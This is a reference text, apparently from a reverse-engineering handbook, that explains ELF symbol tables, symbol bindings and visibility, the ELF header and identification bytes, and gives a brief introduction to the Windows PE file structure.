<p>ELF symbols represent symbolic references to certain pieces of code and data such as functions and global variables. For example, the <code>printf()</code> function will have such an entry in the <code>.symtab</code> and <code>.dynsym</code> sections (if the object is dynamically linked).</p>
<h1 id="the-symbol-tables"><a class="header" href="#the-symbol-tables">The Symbol Tables</a></h1>
<p>Ultimately, there exist at most two symbol tables in an ELF object - <code>.symtab</code> and <code>.dynsym</code>. The former will also contain the contents of the latter, however, it is not necessary for dynamic linking and is thus usually omitted in the memory image of a binary. The extraneous symbols in <code>.symtab</code> are simply too big and completely useless during execution time, so <code>.dynsym</code> only contains the information absolutely necessary for dynamic linking. You will see that <code>.symtab</code> has no flags, while <code>.dynsym</code> is marked as <code>ALLOC</code>.</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_Symbol_Tables_Flags.png" alt="" /></p>
<p>Both symbol tables contain entries of the following types:</p>
<pre><code class="language-cpp">typedef struct
{
  Elf32_Word	st_name;		/* Symbol name (string tbl index) */
  Elf32_Addr	st_value;		/* Symbol value */
  Elf32_Word	st_size;		/* Symbol size */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char	st_other;		/* Symbol visibility */
  Elf32_Section	st_shndx;		/* Section index */
} Elf32_Sym;

typedef struct
{
  Elf64_Word	st_name;		/* Symbol name (string tbl index) */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char st_other;		/* Symbol visibility */
  Elf64_Section	st_shndx;		/* Section index */
  Elf64_Addr	st_value;		/* Symbol value */
  Elf64_Xword	st_size;		/* Symbol size */
} Elf64_Sym;
</code></pre>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_Symbol.png" alt="" /></p>
<ul>
<li><code>st_name</code> - an offset (in bytes) from the beginning of the symbol name string table (either <code>.dynstr</code> or <code>.strtab</code>), where the name of the symbol is located.</li>
<li><code>st_value</code> - the value of the symbol, which is either an address or an offset of its location.</li>
<li><code>st_size</code> - symbols may have an associated size. If this field is 0, the symbol has no size or it is unknown</li>
<li><code>st_other</code> - defines the symbol's visibility.</li>
<li><code>st_shndx</code> - since each symbol is defined in relation to some section, the index of the section header corresponding to the relevant section is stored in this field.</li>
<li><code>st_info</code> - this field specifies the symbol type and binding.</li>
</ul>
<p>You can view the symbol tables by adding the <code>-s</code> flag to <code>readelf</code>:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_Read_Symbols.png" alt="" /></p>
<p>If a symbol's value refers to a specific location within a section, <code>st_shndx</code> holds an index into the section header table. As the section moves during relocation, the symbol's value changes as well. Certain section indices, however, have reserved semantics:</p>
<p><code>SHN_ABS</code> specifies that the symbol value is absolute and won't change during relocation.</p>
<p><code>SHN_COMMON</code> labels a yet unallocated common block. The symbol's value holds alignment constraints. The linker allocates storage for the symbol at an address that is a multiple of the symbol value, while the <code>st_size</code> field holds the number of bytes necessary for the allocation. Such symbols may only occur in relocatable files.</p>
<p><code>SHN_UNDEF</code> specifies an undefined symbol. When the linker combines this object file with another which defines the symbol, this file's references to the symbol will be linked directly to the actual definition.</p>
<p><code>SHN_XINDEX</code> serves as an escape value and indicates that the relevant section header index is too large to fit in the the symbol. Therefore, the section header index is actually found in the <code>SHT_SYMTAB_SHNDX</code> section whose entries correspond one-to-one with those in the symbol table. </p>
<h1 id="symbol-types--bindings"><a class="header" href="#symbol-types--bindings">Symbol Types &amp; Bindings</a></h1>
<p>The following table contains the possible symbol bindings:</p>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th>Value</th></tr></thead><tbody>
<tr><td><code>STB_LOCAL</code></td><td>0</td></tr>
<tr><td><code>STB_GLOBAL</code></td><td>1</td></tr>
<tr><td><code>STB_WEAK</code></td><td>2</td></tr>
<tr><td><code>STB_LOOS</code></td><td>10</td></tr>
<tr><td><code>STB_HIOS</code></td><td>12</td></tr>
<tr><td><code>STB_LOPROC</code></td><td>13</td></tr>
<tr><td><code>STB_HIPROC</code></td><td>15</td></tr>
</tbody></table>
</div>
<p><code>STB_LOCAL</code> defines a local symbol. Such symbols are only visible in the object file containing their definition. This means that multiple local symbols with the same name may exist independently inside multiple object files without interfering with each other during linking.</p>
<p><code>STB_GLOBAL</code> defines a global symbol. These symbols are visible to all files being combined. One file's definition of a global symbol will satisfy another file's reference to the same symbol. Multiple global symbols with the same name are not allowed.</p>
<p><code>STB_WEAK</code> defines a weak symbol. Such symbols resemble global symbols, but have definitions with lower precedence. Consequently, the definition of an <code>STB_WEAK</code> symbol will be overridden by the definition of a different symbol with the same name, if such a symbol exists.</p>
<p>The other values are reserved for OS- and processor-specific semantics.</p>
<p>Following is a table containing the possible symbol types:</p>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th>Value</th></tr></thead><tbody>
<tr><td><code>STT_NOTYPE</code></td><td>0</td></tr>
<tr><td><code>STT_OBJECT</code></td><td>1</td></tr>
<tr><td><code>STT_FUNC</code></td><td>2</td></tr>
<tr><td><code>STT_SECTION</code></td><td>3</td></tr>
<tr><td><code>STT_FILE</code></td><td>4</td></tr>
<tr><td><code>STT_COMMON</code></td><td>5</td></tr>
<tr><td><code>STT_TLS</code></td><td>6</td></tr>
<tr><td><code>STT_LOOS</code></td><td>10</td></tr>
<tr><td><code>STT_HIOS</code></td><td>12</td></tr>
<tr><td><code>STT_LOPROC</code></td><td>13</td></tr>
<tr><td><code>STT_HIPROC</code></td><td>15</td></tr>
</tbody></table>
</div>
<p><code>STT_NOTYPE</code> defines a symbol with an undefined type.</p>
<p><code>STT_OBJECT</code> represents a symbol that is associated with data such as a variable, an array, etc.</p>
<p><code>STT_FUNC</code> is a symbol associated with a function.</p>
<p><code>STT_SECTION</code> is a symbol associated with a section. Such entries are typically used for relocation and are of the <code>STB_LOCAL</code> binding.</p>
<p><code>STT_FILE</code> symbols contain the names of source files associated with object files. Such symbols are local, have a section index of <code>SHN_ABS</code> and precede any other local symbols in the file.</p>
<p><code>STT_COMMON</code> describes an uninitialised common block. </p>
<p><code>STT_TLS</code> is a thread-local storage entity. It stores an offset to the symbol and not its address. Such symbols may only be referenced by thread-local storage relocations.</p>
<p>A symbol's type and binding are encoded into and decoded from the <code>st_info</code> field by means of the following macros:</p>
<pre><code class="language-cpp">/* How to extract and insert information held in the st_info field.  */

#define ELF32_ST_BIND(val)		(((unsigned char) (val)) &gt;&gt; 4)
#define ELF32_ST_TYPE(val)		((val) &amp; 0xf)
#define ELF32_ST_INFO(bind, type)	(((bind) &lt;&lt; 4) + ((type) &amp; 0xf))

/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */
#define ELF64_ST_BIND(val)		ELF32_ST_BIND (val)
#define ELF64_ST_TYPE(val)		ELF32_ST_TYPE (val)
#define ELF64_ST_INFO(bind, type)	ELF32_ST_INFO ((bind), (type))
</code></pre>
<h1 id="symbol-visibility"><a class="header" href="#symbol-visibility">Symbol Visibility</a></h1>
<p>The visibility of a symbol specifies how the symbol should be accessed once it has become a part of and executable or shared object, notwithstanding that it may be specified in a relocatable file. In essence, a symbol's visibility tells the linker how that symbol will be used in the end file. Following is a table with the possible visibility values.</p>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th>Value</th></tr></thead><tbody>
<tr><td><code>STV_DEFAULT</code></td><td>0</td></tr>
<tr><td><code>STV_INTERNAL</code></td><td>1</td></tr>
<tr><td><code>STV_HIDDEN</code></td><td>2</td></tr>
<tr><td><code>STV_PROTECTED</code></td><td>3</td></tr>
</tbody></table>
</div>
<p><code>STV_DEFAULT</code> symbols have a visibility equivalent to the one defined by their binding. </p>
<p><code>STV_PROTECTED</code> symbols are visible to other files in the linking process (components), but are not <em>preemptable</em>. This means that references to such symbols from within the defining component <em>must</em> be resolved to the definition in that component. Local symbols cannot be protected.</p>
<p><code>STV_HIDDEN</code> symbols have names which are invisible to external components and may be used for specifying the external interface of a given component. Hidden symbols in relocatable files must be transformed into local symbols by the linker.</p>
<p><code>STV_INTERNAL</code> symbols have a platform-dependent meaning. Ultimately, however, the linker should be able to treat them as hidden symbols. </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-26"><a class="header" href="#introduction-26">Introduction</a></h1>
<p>The ELF header is a data structure which sits at the beginning of every ELF file and describes its layout. It starts with 16 identification bytes that contain the ELF magic bytes. The following structs are defined in <code>&lt;elf.h&gt;</code>:</p>
<pre><code class="language-cpp">#define EI_NIDENT 16

typedef struct {
        unsigned char   e_ident[EI_NIDENT];
        Elf32_Half      e_type;
        Elf32_Half      e_machine;
        Elf32_Word      e_version;
        Elf32_Addr      e_entry;
        Elf32_Off       e_phoff;
        Elf32_Off       e_shoff;
        Elf32_Word      e_flags;
        Elf32_Half      e_ehsize;
        Elf32_Half      e_phentsize;
        Elf32_Half      e_phnum;
        Elf32_Half      e_shentsize;
        Elf32_Half      e_shnum;
        Elf32_Half      e_shstrndx;
} Elf32_Ehdr;

typedef struct {
        unsigned char   e_ident[EI_NIDENT];
        Elf64_Half      e_type;
        Elf64_Half      e_machine;
        Elf64_Word      e_version;
        Elf64_Addr      e_entry;
        Elf64_Off       e_phoff;
        Elf64_Off       e_shoff;
        Elf64_Word      e_flags;
        Elf64_Half      e_ehsize;
        Elf64_Half      e_phentsize;
        Elf64_Half      e_phnum;
        Elf64_Half      e_shentsize;
        Elf64_Half      e_shnum;
        Elf64_Half      e_shstrndx;
} Elf64_Ehdr;
</code></pre>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_Header.png" alt="" /></p>
<ul>
<li><code>e_ident</code> - the initial magic bytes which denote an ELF file.</li>
<li><code>e_type</code> - the type of the object file. </li>
</ul>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Name</th><th style="text-align: center">Value</th><th style="text-align: center">Meaning</th></tr></thead><tbody>
<tr><td style="text-align: center"><code>ET_NONE</code></td><td style="text-align: center">0</td><td style="text-align: center">Unknown</td></tr>
<tr><td style="text-align: center"><code>ET_REL</code></td><td style="text-align: center">1</td><td style="text-align: center">Relocatable file</td></tr>
<tr><td style="text-align: center"><code>ET_EXEC</code></td><td style="text-align: center">2</td><td style="text-align: center">Executable file</td></tr>
<tr><td style="text-align: center"><code>ET_DYN</code></td><td style="text-align: center">3</td><td style="text-align: center">Shared object file</td></tr>
<tr><td style="text-align: center"><code>ET_CORE</code></td><td style="text-align: center">4</td><td style="text-align: center">Core file</td></tr>
<tr><td style="text-align: center"><code>ET_LOOS</code></td><td style="text-align: center"><code>0xfe00</code></td><td style="text-align: center">Operating system-specific</td></tr>
<tr><td style="text-align: center"><code>ET_HIOS</code></td><td style="text-align: center"><code>0xfeff</code></td><td style="text-align: center">Operating system-specific</td></tr>
<tr><td style="text-align: center"><code>ET_LOPROC</code></td><td style="text-align: center"><code>0xff00</code></td><td style="text-align: center">Processor-specific</td></tr>
<tr><td style="text-align: center"><code>ET_HIPROC</code></td><td style="text-align: center"><code>0xffff</code></td><td style="text-align: center">Processor-specific</td></tr>
</tbody></table>
</div>
<ul>
<li><code>e_machine</code> - specifies the required architecture. Values not labeled in the table are reserved for future machine names.</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th style="text-align: center">Value</th><th>Meaning</th></tr></thead><tbody>
<tr><td><code>EM_NONE</code></td><td style="text-align: center">0</td><td>No machine</td></tr>
<tr><td><code>EM_M32</code></td><td style="text-align: center">1</td><td>AT&amp;T WE 32100</td></tr>
<tr><td><code>EM_SPARC</code></td><td style="text-align: center">2</td><td>SPARC</td></tr>
<tr><td><code>EM_386</code></td><td style="text-align: center">3</td><td>Intel 80386</td></tr>
<tr><td><code>EM_68K</code></td><td style="text-align: center">4</td><td>Motorola 68000</td></tr>
<tr><td><code>EM_88K</code></td><td style="text-align: center">5</td><td>Motorola 88000</td></tr>
<tr><td>reserved</td><td style="text-align: center">6</td><td>Reserved for future use (was EM_486)</td></tr>
<tr><td><code>EM_860</code></td><td style="text-align: center">7</td><td>Intel 80860</td></tr>
<tr><td><code>EM_MIPS</code></td><td style="text-align: center">8</td><td>MIPS I Architecture</td></tr>
<tr><td><code>EM_S370</code></td><td style="text-align: center">9</td><td>IBM System/370 Processor</td></tr>
<tr><td><code>EM_MIPS_RS3_LE</code></td><td style="text-align: center">10</td><td>MIPS RS3000 Little-endian</td></tr>
<tr><td>reserved</td><td style="text-align: center">11-14</td><td>Reserved for future use</td></tr>
<tr><td><code>EM_PARISC</code></td><td style="text-align: center">15</td><td>Hewlett-Packard PA-RISC</td></tr>
<tr><td>reserved</td><td style="text-align: center">16</td><td>Reserved for future use</td></tr>
<tr><td><code>EM_VPP500</code></td><td style="text-align: center">17</td><td>Fujitsu VPP500</td></tr>
<tr><td><code>EM_SPARC32PLUS</code></td><td style="text-align: center">18</td><td>Enhanced instruction set SPARC</td></tr>
<tr><td><code>EM_960</code></td><td style="text-align: center">19</td><td>Intel 80960</td></tr>
<tr><td><code>EM_PPC</code></td><td style="text-align: center">20</td><td>PowerPC</td></tr>
<tr><td><code>EM_PPC64</code></td><td style="text-align: center">21</td><td>64-bit PowerPC</td></tr>
<tr><td><code>EM_S390</code></td><td style="text-align: center">22</td><td>IBM System/390 Processor</td></tr>
<tr><td>reserved</td><td style="text-align: center">23-35</td><td>Reserved for future use</td></tr>
<tr><td><code>EM_V800</code></td><td style="text-align: center">36</td><td>NEC V800</td></tr>
<tr><td><code>EM_FR20</code></td><td style="text-align: center">37</td><td>Fujitsu FR20</td></tr>
<tr><td><code>EM_RH32</code></td><td style="text-align: center">38</td><td>TRW RH-32</td></tr>
<tr><td><code>EM_RCE</code></td><td style="text-align: center">39</td><td>Motorola RCE</td></tr>
<tr><td><code>EM_ARM</code></td><td style="text-align: center">40</td><td>Advanced RISC Machines ARM</td></tr>
<tr><td><code>EM_ALPHA</code></td><td style="text-align: center">41</td><td>Digital Alpha</td></tr>
<tr><td><code>EM_SH</code></td><td style="text-align: center">42</td><td>Hitachi SH</td></tr>
<tr><td><code>EM_SPARCV9</code></td><td style="text-align: center">43</td><td>SPARC Version 9</td></tr>
<tr><td><code>EM_TRICORE</code></td><td style="text-align: center">44</td><td>Siemens TriCore embedded processor</td></tr>
<tr><td><code>EM_ARC</code></td><td style="text-align: center">45</td><td>Argonaut RISC Core, Argonaut Technologies Inc.</td></tr>
<tr><td><code>EM_H8_300</code></td><td style="text-align: center">46</td><td>Hitachi H8/300</td></tr>
<tr><td><code>EM_H8_300H</code></td><td style="text-align: center">47</td><td>Hitachi H8/300H</td></tr>
<tr><td><code>EM_H8S</code></td><td style="text-align: center">48</td><td>Hitachi H8S</td></tr>
<tr><td><code>EM_H8_500</code></td><td style="text-align: center">49</td><td>Hitachi H8/500</td></tr>
<tr><td><code>EM_IA_64</code></td><td style="text-align: center">50</td><td>Intel IA-64 processor architecture</td></tr>
<tr><td><code>EM_MIPS_X</code></td><td style="text-align: center">51</td><td>Stanford MIPS-X</td></tr>
<tr><td><code>EM_COLDFIRE</code></td><td style="text-align: center">52</td><td>Motorola ColdFire</td></tr>
<tr><td><code>EM_68HC12</code></td><td style="text-align: center">53</td><td>Motorola M68HC12</td></tr>
<tr><td><code>EM_MMA</code></td><td style="text-align: center">54</td><td>Fujitsu MMA Multimedia Accelerator</td></tr>
<tr><td><code>EM_PCP</code></td><td style="text-align: center">55</td><td>Siemens PCP</td></tr>
<tr><td><code>EM_NCPU</code></td><td style="text-align: center">56</td><td>Sony nCPU embedded RISC processor</td></tr>
<tr><td><code>EM_NDR1</code></td><td style="text-align: center">57</td><td>Denso NDR1 microprocessor</td></tr>
<tr><td><code>EM_STARCORE</code></td><td style="text-align: center">58</td><td>Motorola Star*Core processor</td></tr>
<tr><td><code>EM_ME16</code></td><td style="text-align: center">59</td><td>Toyota ME16 processor</td></tr>
<tr><td><code>EM_ST100</code></td><td style="text-align: center">60</td><td>STMicroelectronics ST100 processor</td></tr>
<tr><td><code>EM_TINYJ</code></td><td style="text-align: center">61</td><td>Advanced Logic Corp. TinyJ embedded processor family</td></tr>
<tr><td><code>EM_X86_64</code></td><td style="text-align: center">62</td><td>AMD x86-64 architecture</td></tr>
<tr><td><code>EM_PDSP</code></td><td style="text-align: center">63</td><td>Sony DSP Processor</td></tr>
<tr><td><code>EM_PDP10</code></td><td style="text-align: center">64</td><td>Digital Equipment Corp. PDP-10</td></tr>
<tr><td><code>EM_PDP11</code></td><td style="text-align: center">65</td><td>Digital Equipment Corp. PDP-11</td></tr>
<tr><td><code>EM_FX66</code></td><td style="text-align: center">66</td><td>Siemens FX66 microcontroller</td></tr>
<tr><td><code>EM_ST9PLUS</code></td><td style="text-align: center">67</td><td>STMicroelectronics ST9+ 8/16 bit microcontroller</td></tr>
<tr><td><code>EM_ST7</code></td><td style="text-align: center">68</td><td>STMicroelectronics ST7 8-bit microcontroller</td></tr>
<tr><td><code>EM_68HC16</code></td><td style="text-align: center">69</td><td>Motorola MC68HC16 Microcontroller</td></tr>
<tr><td><code>EM_68HC11</code></td><td style="text-align: center">70</td><td>Motorola MC68HC11 Microcontroller</td></tr>
<tr><td><code>EM_68HC08</code></td><td style="text-align: center">71</td><td>Motorola MC68HC08 Microcontroller</td></tr>
<tr><td><code>EM_68HC05</code></td><td style="text-align: center">72</td><td>Motorola MC68HC05 Microcontroller</td></tr>
<tr><td><code>EM_SVX</code></td><td style="text-align: center">73</td><td>Silicon Graphics SVx</td></tr>
<tr><td><code>EM_ST19</code></td><td style="text-align: center">74</td><td>STMicroelectronics ST19 8-bit microcontroller</td></tr>
<tr><td><code>EM_VAX</code></td><td style="text-align: center">75</td><td>Digital VAX</td></tr>
<tr><td><code>EM_CRIS</code></td><td style="text-align: center">76</td><td>Axis Communications 32-bit embedded processor</td></tr>
<tr><td><code>EM_JAVELIN</code></td><td style="text-align: center">77</td><td>Infineon Technologies 32-bit embedded processor</td></tr>
<tr><td><code>EM_FIREPATH</code></td><td style="text-align: center">78</td><td>Element 14 64-bit DSP Processor</td></tr>
<tr><td><code>EM_ZSP</code></td><td style="text-align: center">79</td><td>LSI Logic 16-bit DSP Processor</td></tr>
<tr><td><code>EM_MMIX</code></td><td style="text-align: center">80</td><td>Donald Knuth's educational 64-bit processor</td></tr>
<tr><td><code>EM_HUANY</code></td><td style="text-align: center">81</td><td>Harvard University machine-independent object files</td></tr>
<tr><td><code>EM_PRISM</code></td><td style="text-align: center">82</td><td>SiTera Prism</td></tr>
<tr><td><code>EM_AVR</code></td><td style="text-align: center">83</td><td>Atmel AVR 8-bit microcontroller</td></tr>
<tr><td><code>EM_FR30</code></td><td style="text-align: center">84</td><td>Fujitsu FR30</td></tr>
<tr><td><code>EM_D10V</code></td><td style="text-align: center">85</td><td>Mitsubishi D10V</td></tr>
<tr><td><code>EM_D30V</code></td><td style="text-align: center">86</td><td>Mitsubishi D30V</td></tr>
<tr><td><code>EM_V850</code></td><td style="text-align: center">87</td><td>NEC v850</td></tr>
<tr><td><code>EM_M32R</code></td><td style="text-align: center">88</td><td>Mitsubishi M32R</td></tr>
<tr><td><code>EM_MN10300</code></td><td style="text-align: center">89</td><td>Matsushita MN10300</td></tr>
<tr><td><code>EM_MN10200</code></td><td style="text-align: center">90</td><td>Matsushita MN10200</td></tr>
<tr><td><code>EM_PJ</code></td><td style="text-align: center">91</td><td>picoJava</td></tr>
<tr><td><code>EM_OPENRISC</code></td><td style="text-align: center">92</td><td>OpenRISC 32-bit embedded processor</td></tr>
<tr><td><code>EM_ARC_A5</code></td><td style="text-align: center">93</td><td>ARC Cores Tangent-A5</td></tr>
<tr><td><code>EM_XTENSA</code></td><td style="text-align: center">94</td><td>Tensilica Xtensa Architecture</td></tr>
<tr><td><code>EM_VIDEOCORE</code></td><td style="text-align: center">95</td><td>Alphamosaic VideoCore processor</td></tr>
<tr><td><code>EM_TMM_GPP</code></td><td style="text-align: center">96</td><td>Thompson Multimedia General Purpose Processor</td></tr>
<tr><td><code>EM_NS32K</code></td><td style="text-align: center">97</td><td>National Semiconductor 32000 series</td></tr>
<tr><td><code>EM_TPC</code></td><td style="text-align: center">98</td><td>Tenor Network TPC processor</td></tr>
<tr><td><code>EM_SNP1K</code></td><td style="text-align: center">99</td><td>Trebia SNP 1000 processor</td></tr>
<tr><td><code>EM_ST200</code></td><td style="text-align: center">100</td><td>STMicroelectronics (www.st.com) ST200 microcontroller</td></tr>
</tbody></table>
</div>
<ul>
<li><code>e_version</code> - specifies the ELF version.</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th>Value</th><th>Meaning</th></tr></thead><tbody>
<tr><td>EV_NONE</td><td>0</td><td>Invalid version</td></tr>
<tr><td>EV_CURRENT</td><td>1</td><td>Current version</td></tr>
</tbody></table>
</div>
<ul>
<li><code>e_entry</code> - the virtual address of the entry point. If there is no entry point, this member is 0.</li>
<li><code>e_phoff</code> - the offset (in bytes) from the beginning of the ELF header for the Program Header Table. If the file does not contain such a table, this member is 0.</li>
<li><code>e_shoff</code> - the offset (in bytes) from the beginning of the ELF header for the Section Header Table. If the file does not contain such a table, this member is 0.</li>
<li><code>e_flags</code> - processor-specific flags which take values of the form <code>EF_flag_name</code>.</li>
<li><code>e_ehsize</code> - the size of the ELF header in bytes.</li>
<li><code>e_phentsize</code> - the size of an entry in the Program Header Table. All entries are equally-sized.</li>
<li><code>e_phnum</code> - the number of entries in the Program Header Table.</li>
<li><code>e_shentsize</code> - the size of an entry in the Section Header Table. All entries are equally-sized.</li>
<li><code>e_shnum</code> - the number of entries in the Section Header Table. If the number of sections is greater than or equal to <code>SHN_LORESERVE</code> (<code>0xff00</code>), this member is 0 and the actual number of entries in the Section Header Table is contained in the <code>sh_size</code> field of the first section header (at index 0). Otherwise, the <code>sh_size</code> member of the initial entry contains 0.</li>
<li><code>e_shstrndx</code> - the Section Header Table index of the entry which is associated with the section name string table. If there is no such table, this holds <code>SHN_UNDEF</code>.  If this index is greater than or equal to <code>SHN_LORESERVE</code> (<code>0xff00</code>), this member contains <code>SHN_XINDEX</code> (<code>0xffff</code>) and the actual index of the section name string table section is stored in the <code>sh_link</code> field of the first section header (at index 0). Otherwise, the <code>sh_link</code> member of the initial entry contains 0.</li>
</ul>
<h1 id="elf-identification"><a class="header" href="#elf-identification">ELF Identification</a></h1>
<p>Since ELF supports multiple types of processors, data encodings and machines, the first 16 bytes provide information as to how to interpret the file, regardless of the rest of its contents. These are the indices and meaning of each identification byte (<code>e_ident</code>):</p>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th style="text-align: center">Index</th><th>Purpose</th></tr></thead><tbody>
<tr><td><code>EI_MAG0</code></td><td style="text-align: center">0</td><td>File identification</td></tr>
<tr><td><code>EI_MAG1</code></td><td style="text-align: center">1</td><td>File identification</td></tr>
<tr><td><code>EI_MAG2</code></td><td style="text-align: center">2</td><td>File identification</td></tr>
<tr><td><code>EI_MAG3</code></td><td style="text-align: center">3</td><td>File identification</td></tr>
<tr><td><code>EI_CLASS</code></td><td style="text-align: center">4</td><td>File class</td></tr>
<tr><td><code>EI_DATA</code></td><td style="text-align: center">5</td><td>Data encoding</td></tr>
<tr><td><code>EI_VERSION</code></td><td style="text-align: center">6</td><td>File version</td></tr>
<tr><td><code>EI_OSABI</code></td><td style="text-align: center">7</td><td>Operating system/ABI identification</td></tr>
<tr><td><code>EI_ABIVERSION</code></td><td style="text-align: center">8</td><td>ABI version</td></tr>
<tr><td><code>EI_PAD</code></td><td style="text-align: center">9</td><td>Start of padding bytes</td></tr>
<tr><td><code>EI_NIDENT</code></td><td style="text-align: center">16</td><td>Size of <code>e_ident[]</code></td></tr>
</tbody></table>
</div>
<p>The first 4 bytes contain the magic bytes which identify an ELF file and always have the same values:</p>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th style="text-align: center">Value</th><th>Position</th></tr></thead><tbody>
<tr><td><code>ELFMAG0</code></td><td style="text-align: center"><code>0x7f</code></td><td><code>e_ident[EI_MAG0]</code></td></tr>
<tr><td><code>ELFMAG1</code></td><td style="text-align: center"><code>'E'</code></td><td><code>e_ident[EI_MAG1]</code></td></tr>
<tr><td><code>ELFFMAG2</code></td><td style="text-align: center"><code>'L'</code></td><td><code>e_ident[EI_MAG2]</code></td></tr>
<tr><td><code>ELFFMAG3</code></td><td style="text-align: center"><code>'F'</code></td><td><code>e_ident[EI_MAG3]</code></td></tr>
</tbody></table>
</div>
<p>Next is the <code>EI_CLASS</code> byte which describes the file's class - whether it is a 32-bit or 64-bit file. </p>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th style="text-align: center">Value</th><th>Meaning</th></tr></thead><tbody>
<tr><td><code>ELFCLASSNONE</code></td><td style="text-align: center">0</td><td>Invalid class</td></tr>
<tr><td><code>ELFCLASS32</code></td><td style="text-align: center">1</td><td>32-bit</td></tr>
<tr><td><code>ELFCLASS64</code></td><td style="text-align: center">2</td><td>64-bit</td></tr>
</tbody></table>
</div>
<p><code>EI_DATA</code> specifies the encoding of the data structures in the ELF file.</p>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th style="text-align: center">Value</th><th>Meaning</th></tr></thead><tbody>
<tr><td><code>ELFDATANONE</code></td><td style="text-align: center">0</td><td>Invalid data encoding</td></tr>
<tr><td><code>ELFDATA2LSB</code></td><td style="text-align: center">1</td><td>2's complement, little-endian</td></tr>
<tr><td><code>ELFDATA2MSB</code></td><td style="text-align: center">2</td><td>2's complement, big-endian</td></tr>
</tbody></table>
</div>
<p><code>EI_VERSION</code> contains the ELF header version and must be set to <code>EV_CURRENT</code>.</p>
<p><code>EI_OSABI</code> specifies OS- or ABI-specific extensions used by the file. Certain fields in other ELF structures contain values with OS- or ABI-specific meaning and their interpretation is determined by this byte. This byte should be set to 0 if no such extensions are used. The meaning of values between 64 and 255 is determined by the <code>e_machine</code> member of the ELF header. Furthermore, ABIs may define their own meanings for this byte, but otherwise, it should be interpreted in the following way:</p>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th style="text-align: center">Value</th><th>Meaning</th></tr></thead><tbody>
<tr><td><code>ELFOSABI_NONE</code></td><td style="text-align: center">0</td><td>No extensions</td></tr>
<tr><td><code>ELFOSABI_HPUX</code></td><td style="text-align: center">1</td><td>Hewlett-Packard HP-UX</td></tr>
<tr><td><code>ELFOSABI_NETBSD</code></td><td style="text-align: center">2</td><td>NetBSD</td></tr>
<tr><td><code>ELFOSABI_LINUX</code></td><td style="text-align: center">3</td><td>Linux</td></tr>
<tr><td><code>ELFOSABI_SOLARIS</code></td><td style="text-align: center">6</td><td>Sun Solaris</td></tr>
<tr><td><code>ELFOSABI_AIX</code></td><td style="text-align: center">7</td><td>AIX</td></tr>
<tr><td><code>ELFOSABI_IRIX</code></td><td style="text-align: center">8</td><td>IRIX</td></tr>
<tr><td><code>ELFOSABI_FREEBSD</code></td><td style="text-align: center">9</td><td>FreeBSD</td></tr>
<tr><td><code>ELFOSABI_TRU64</code></td><td style="text-align: center">10</td><td>Compaq TRU64 UNIX</td></tr>
<tr><td><code>ELFOSABI_MODESTO</code></td><td style="text-align: center">11</td><td>Novell Modesto</td></tr>
<tr><td><code>ELFOSABI_OPENBSD</code></td><td style="text-align: center">12</td><td>Open BSD</td></tr>
<tr><td><code>ELFOSABI_OPENVMS</code></td><td style="text-align: center">13</td><td>Open VMS</td></tr>
<tr><td><code>ELFOSABI_NSK</code></td><td style="text-align: center">14</td><td>Hewlett-Packard Non-Stop Kernel</td></tr>
<tr><td></td><td style="text-align: center">64-255</td><td>Architecture-specific value range</td></tr>
</tbody></table>
</div>
<p><code>EI_ABIVERSION</code> identifies the target ABI version and is used to distinguish between incompatible ABI versions. The byte's interpretation depends on the ABI specified by <code>EI_OSABI</code>. If it is unspecified, <code>EI_ABIVERSION</code> should contain 0.</p>
<p><code>EI_PAD</code> - demarcates the beginning of the unused bytes in <code>e_ident</code>, which are reserved and set to 0. The value of this byte may change as meanings are assigned to these unused bytes.</p>
<p>You can view the ELF header of an ELF binary by using <code>readelf</code> with the <code>-h</code> option:
<img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_Header_read.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-27"><a class="header" href="#introduction-27">Introduction</a></h1>
<p>PE is short for <em>Portable Executable</em> and it describes the structure of image and object files under the Windows family of operating systems. It is the successor of COFF files and encompasses a wide range of formats, including executables (<code>.exe</code>), dynamic-link libraries (<code>.dll</code>), kernel modules (<code>.srv</code>), and control panel applications (<code>.cpl</code>).</p>
<p>A very good programme for analysing PE files is <a href="https://hshrzd.wordpress.com/pe-bear/">PE-Bear</a>.</p>
<h1 id="structure-1"><a class="header" href="#structure-1">Structure</a></h1>
<p>The structure of a typical PE file looks like the following:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/PE/Resources/Images/PE_Structure.png" alt="" /></p>
<p>The file begins with a DOS header which marks it as an MS-DOS executable. Next follows the DOS stub, which is a simple programme which gets executed if the PE file is run in DOS mode and typically prints an error message. Following are the three NT headers - the PE 4-byte PE signature, the standard COFF file header, and the Optional header. Furthermore, it is possible that between the DOS Stub and the NT headers there is a space called the Rich Header. After the NT headers follows the Section Table which contains a section header for each section. At the end are the sections themselves which contain the actual contents of the file.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-28"><a class="header" href="#introduction-28">Introduction</a></h1>
<p>The NT headers follow after the <a href="Reverse%20Engineering/Binary%20Formats/PE/The%20DOS%20Stub.html"> DOS Stub</a> or the <a href="Reverse%20Engineering/Binary%20Formats/PE/The%20Rich%20Header.html">Rich Header</a>, if such is present. They are defined in a struct which has two versions - a 32-bit version for PE32 and a 64-bit one for PE32+ files. The main difference between the versions is the Optional Header which also has two versions. The structs are all defined in <code>&lt;winnt.h&gt;</code>:</p>
